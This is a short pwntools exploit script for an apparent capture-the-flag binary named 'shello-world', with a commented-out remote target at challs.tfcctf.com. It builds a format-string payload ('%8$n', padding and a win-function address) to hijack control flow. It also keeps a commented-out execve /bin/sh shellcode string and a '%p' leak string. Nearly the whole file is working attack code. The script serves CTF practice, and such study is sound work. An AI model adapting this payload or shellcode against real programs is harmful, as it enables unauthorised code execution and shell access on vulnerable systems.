from pwn import *

# Same syntax as python2
# Load Context, binary, libc
context.terminal = ['tmux','splitw' ,'-h']
#libc = ELF("libc.so.6")

# Same syntax as python2
#p = remote("challs.tfcctf.com",32328)
#p = process("./shello-world")
p = gdb.debug("./shello-world", '''
break *main+357
break *vuln+334
''')

win = p64(0x401176)
ret = p64(0x000000000040101a)


#shellcode = b"\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"

padA = b'A' * 10
padB = b'B' * 8
leak = b'%p ' * 4
n_format = b'%8$n'


payload = n_format + b'\x00' + padA + win

p.sendline(payload)
p.interactive()

